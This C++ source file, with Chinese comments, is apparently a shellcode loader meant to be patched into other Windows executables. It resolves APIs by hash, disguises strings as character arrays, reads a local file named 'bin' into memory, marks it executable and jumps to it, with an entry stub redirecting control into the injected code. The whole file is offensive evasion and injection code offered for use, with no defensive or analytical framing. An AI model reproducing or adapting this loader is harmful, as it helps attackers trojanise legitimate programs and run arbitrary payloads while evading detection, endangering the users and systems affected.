/*
 * 文件名称: ToolsBypass.cpp
 * 作者: yinsel
 * 创建日期: 2024.08.03
 * 描述: 自定义patch的shellcode
 */

#include<windows.h>
#include<wininet.h>

#include "utils.hpp"
#include "api.hpp"

#define EXPORT extern "C" __declspec(dllexport)

#include<stdio.h>

typedef struct _FUNCTIONS {
	// Kernel32.dll
	LoadLibraryAFunc pLoadLibraryA;
	WinExecFunc pWinExec;
	GetFileAttributesAFunc pGetFileAttributesA;
	ExitProcessFunc pExitProcess;
	CreateFileAFunc pCreateFileA;
	GetFileSizeFunc pGetFileSize;
	VirtualAllocFunc pVirtualAlloc;
	ReadFileFunc pReadFile;
	VirtualProtectFunc pVirtualProtect;
	GetStdHandleFunc pGetStdHandle;
	WriteConsoleAFunc pWriteConsoleA;
	SleepFunc pSleep;

	// User32.dll
	MessageBoxAFunc pMessageBoxA;
	MessageBoxWFunc pMessageBoxW;
}Functions, * PFunctions;


// 定义程序入口
#pragma comment(linker,"/entry:Main")

// RVA
constexpr auto InitAddr = 0x000309B0;
constexpr auto RunAddr = 0x0000695A0;

/*
	该函数负责初始化需要的函数地址
*/
#pragma code_seg("Init")
EXPORT void Init(PFunctions API) {
	_DWORD dwNtdll = GetNtdllAddr();
	_DWORD dwKernel32 = GetKernel32Addr();

	API->pLoadLibraryA = (LoadLibraryAFunc)GetFuncAddrByHash(dwKernel32, LoadLibraryAHash);
	volatile char szUser32[] = { 'U', 's', 'e', 'r', '3', '2', '.', 'd', 'l', 'l', '\0' };
	_DWORD dwUser32 = (_DWORD)API->pLoadLibraryA((char*)szUser32);

	DWORD ntdllFunHashes[] = { 0x00 };
	DWORD kernel32FunHashes[] = {
		LoadLibraryAHash,GetFileAttributesAHash,ExitProcessHash,
		CreateFileAHash,GetFileSizeHash,VirtualAllocHash,ReadFileHash,
		VirtualProtectHash,GetStdHandleHash,WriteConsoleAHash,SleepHash };
	DWORD user32FunHashes[] = { MessageBoxAHash };

	Function functions[] = {
		{ dwNtdll,ntdllFunHashes,sizeof(ntdllFunHashes) / sizeof(DWORD) },
		{ dwKernel32,kernel32FunHashes,sizeof(kernel32FunHashes) / sizeof(DWORD)},
		{ dwUser32,user32FunHashes,sizeof(user32FunHashes) / sizeof(DWORD) }
	};

	void** api = (void**)API;
	int offset = 0;
	for (size_t i = 0; i < sizeof(functions) / sizeof(Function); i++) {
		const Function func = functions[i];
		for (DWORD j = 0; j < func.count; j++) {
			if (func.funcHashs[j] != 0x00) {
				*(api + offset) = (void*)GetFuncAddrByHash(func.dwDllBase, func.funcHashs[j]);
			}
			else {
				continue;
			}
			offset++;
		}
	}
}

/*
	shellcode
	加载bin文件至内存执行
*/
#pragma code_seg("Run")
EXPORT int Run(_DWORD dwExeBase) {
	Functions API;
	// 初始化函数地址
	((void(*)(PFunctions))(dwExeBase + InitAddr))(&API);
	char szbin[] = { 'b', 'i', 'n', '\0' };
	volatile char log[] = { '[', 'L', 'o', 'g', ']', ' ', 'b', 'i', 'n', ' ', 'n', 'o', 't', ' ', 'e', 'x', 'i', 's', 't', 's', '\0' };
	volatile char loding[] = { '[', 'L', 'o', 'g', ']', ' ', 'L', 'o', 'd', 'i', 'n', 'g', '.', '.', '.', '\0' };

	HANDLE hConsole = API.pGetStdHandle(STD_OUTPUT_HANDLE);

	if (hConsole == NULL) {
		API.pExitProcess(-1);
		return -6;
	}

	
	/*
		判断文件是否存在
	*/
	DWORD result = API.pGetFileAttributesA(szbin);
	if (result == INVALID_FILE_ATTRIBUTES) {
		API.pWriteConsoleA(hConsole, (char*)log, strlen((char*)log), NULL, NULL);
		API.pExitProcess(-1);
		return -1;
	}

	/*
		读取文件至内存
	*/
	HANDLE hFile = API.pCreateFileA(szbin, GENERIC_READ, 0, NULL, OPEN_EXISTING, 0, NULL);
	if (hFile == INVALID_HANDLE_VALUE) {
		return -2;
	}
	DWORD fileSize = API.pGetFileSize(hFile, NULL);
	if (fileSize <= 0) {
		return -3;
	}
	BYTE* Buffer = (BYTE*)API.pVirtualAlloc(NULL, fileSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	if (Buffer == NULL) {
		return -4;
	}
	DWORD byteRead;
	if (!API.pReadFile(hFile, Buffer, fileSize, &byteRead, NULL) || byteRead <= 0) {
		return -5;
	}
	DWORD old;
	if (!API.pVirtualProtect(Buffer, fileSize, PAGE_EXECUTE_READWRITE, &old)) {
		return -6;
	}

	API.pWriteConsoleA(hConsole, (char*)loding, strlen((char*)loding), NULL, NULL);

	API.pSleep(1500);

	// 运行shellcode
	((void(*)())Buffer)();

}

/*
	负责跳转
*/
#pragma code_seg("Entry")
EXPORT void goto_shellcode() {
	_DWORD dwExeBase = GetExeBaseAddr();
	if (dwExeBase != NULL) {
		if (dwExeBase == 0x16464888) {
			_DWORD addr = ((_DWORD(*)(_DWORD))(dwExeBase + 0x4678))(dwExeBase);
			((void(*)(_DWORD))(addr))(dwExeBase);
		}
		if (dwExeBase != 0xff5546) {
			// 跳转至真正的shellcode
			DWORD result = ((int(*)(_DWORD))(dwExeBase + RunAddr))(dwExeBase);
			if (result) {
				((void(*)(_DWORD))(dwExeBase + 0x88ff7))(dwExeBase);
			}
			else {
				return;
			}
		}
	}
}


/*
	程序入口，无任何作用
*/
void Main() {

}